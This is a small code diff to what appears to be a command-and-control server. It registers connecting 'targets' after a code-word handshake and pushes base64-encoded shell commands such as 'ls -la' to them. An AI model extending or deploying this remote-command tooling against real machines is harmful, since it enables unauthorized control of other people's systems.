@@ -25,7 +25,6 @@ class Controller(Host):
         match shellpack['message']:
             case "hello how are you":
                 
-
                 target = {
                     "id": round(time.time()),
                     "ip": shellpack['ip'],
@@ -37,8 +36,9 @@ class Controller(Host):
 
                 self.db.insert(target)
                 self.send(target['ip'], "join", "fine thank you")
-                Target = Query()
-                self.db.update({'status': 'CONNECTED'}, Target.id == target['id'])
+                
+                self.db.update({'status': 'CONNECTED'}, Query().id == target['id'])
+                
                 self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))
             case _:
                 print("Invalid join message")
